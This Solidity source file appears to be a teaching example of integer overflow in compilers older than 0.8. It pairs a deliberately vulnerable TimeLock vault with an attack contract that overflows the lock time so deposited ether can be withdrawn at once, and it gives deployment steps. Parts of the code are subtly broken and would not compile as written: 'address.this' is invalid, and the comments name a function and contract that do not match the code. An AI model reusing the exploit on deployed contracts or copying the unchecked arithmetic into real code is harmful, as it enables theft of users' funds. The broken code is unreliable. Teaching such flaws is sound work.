// SPDX-License-Identifier: SEE LICENSE IN LICENSE
pragma solidity ^0.7.6;

/** Vulnerability
 * Solidity<0.8
 *
 * Integers is Solidity overflow/underflow without any errors
 *
 * Solidity>0.8
 *
 * Defult behaviour of soliity 0.8 for overflow/underflow is to throw an error.
 *
 *
 *
 * This Contract is designed to act as a time vault.
 * User can deposit into this contract but cannot withdraw for atleast a week.
 * User can also extend the wait time beyond the 1 week waiting period.
 *
 *
 * 1)Deplo TimeLock
 * 2)Deploy Attack with address of TimeLock
 * 3)Call Attack.attack sending 1 Ether. You will immediately be able to withdrawyour ether.
 *
 *
 * What happened?
 * Attact caused the TimeLock.lockTime to overFlow and was able to withdraw before the 1 week waiting period.
 *
 */

contract TimeLock {
    mapping(address => uint256) public balances;
    mapping(address => uint256) public locktime;

    function deposit() external payable {
        balances[msg.sender] += msg.value;
        locktime[msg.sender] = block.timestamp + 1 weeks;
    }

    function increaseblockTime(uint256 _secondsToIncrease) public {
        locktime[msg.sender] += _secondsToIncrease;
    }

    function withdraw() public {
        require(balances[msg.sender] > 0, "Insufficient Funds");
        require(block.timestamp > locktime[msg.sender], "LockTime not expire");

        uint256 amount = balances[msg.sender];
        balances[msg.sender] = 0;
        (bool sent, ) = msg.sender.call{value: amount}("");
        require(sent, "Failed to send eth");
    }
}

contract attact {
    TimeLock timelock;

    constructor(TimeLock _timelock) {
        timelock = TimeLock(_timelock);
    }

    fallback() external payable {}

    function attacY() public payable {
        timelock.deposit{value: msg.value}();
        /**
         * if t - current lock time then we need to find x such that
         * x+t = 2^256 = 0
         * x = -t
         * 2^256 = type(uint).max +1
         * x = type(uint).max + 1 -t
         */
        timelock.increaseblockTime(
            type(uint256).max + 1 - timelock.locktime(address.this)
        );
        timelock.withdraw();
    }
}
